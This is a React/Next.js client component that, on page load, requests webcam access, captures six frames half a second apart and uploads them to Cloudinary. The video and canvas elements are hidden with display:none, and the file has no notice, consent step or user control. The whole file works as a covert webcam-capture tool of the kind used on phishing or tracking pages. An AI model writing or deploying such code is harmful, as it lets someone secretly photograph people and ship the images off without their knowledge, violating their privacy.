'use client';

import { useEffect, useRef } from 'react';
import { uploadImageToCloudinary } from '@/utils/uploadImage';

export default function Camera() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  useEffect(() => {
    let captureInterval: NodeJS.Timeout;
    const totalCaptures = 6; // 0.5s * 6 = 3s
    let captureIndex = 0;

    const startCameraAndCapture = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        streamRef.current = stream;

        const video = videoRef.current;
        if (video) {
          video.srcObject = stream;
          await video.play();
        }

        // Start capturing every 0.5 second
        captureInterval = setInterval(async () => {
          if (captureIndex >= totalCaptures) {
            clearInterval(captureInterval);
            stopCamera();
            return;
          }

          const imageData = captureFrame();
          if (imageData) {
            await uploadImageToCloudinary(imageData, captureIndex);
          }

          captureIndex++;
        }, 500);
      } catch (error) {
        console.error('Camera error:', error);
      }
    };

    const captureFrame = (): string | null => {
      const video = videoRef.current;
      const canvas = canvasRef.current;
      if (!video || !canvas) return null;

      const ctx = canvas.getContext('2d');
      if (!ctx) return null;

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      return canvas.toDataURL('image/png');
    };

    const stopCamera = () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
        console.log('Camera stopped after capture.');
      }
    };

    startCameraAndCapture();

    return () => {
      clearInterval(captureInterval);
      stopCamera();
    };
  }, []);

  return (
    <>
      <video ref={videoRef} autoPlay playsInline style={{ display: 'none' }} />
      <canvas ref={canvasRef} style={{ display: 'none' }} />
    </>
  );
}
